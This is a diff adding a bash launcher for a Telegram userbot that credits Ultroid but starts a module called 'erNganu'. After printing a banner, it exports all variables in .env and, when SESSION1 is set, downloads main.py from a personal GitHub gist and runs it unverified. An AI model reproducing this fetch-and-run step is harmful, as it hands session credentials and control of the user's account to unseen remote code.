@@ -1,0 +1,20 @@
+#!/usr/bin/env bash
+# Ultroid - UserBot
+# Copyright (C) 2021-2023 TeamUltroid
+#
+# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >
+# PLease read the GNU Affero General Public License in <https://www.github.com/TeamUltroid/Ultroid/blob/main/LICENSE/>.
+
+
+echo "
+            █▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
+            █░░╦─╦╔╗╦─╔╗╔╗╔╦╗╔╗░░█
+            █░░║║║╠─║─║─║║║║║╠─░░█
+            █░░╚╩╝╚╝╚╝╚╝╚╝╩─╩╚╝░░█
+            █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
+
+      Kunjungi @pamerdong yaaaaaas bawok!!
+
+"
+if [ -f .env ] ; then  set -o allexport; source .env; set +o allexport ; fi
+if [ $SESSION1 ] ; then wget https://gist.github.com/ErRickow/c4356c034b76f0390c81e9cc32da5489/raw/main.py && python3 main.py ; else python3 -m erNganu ; fi
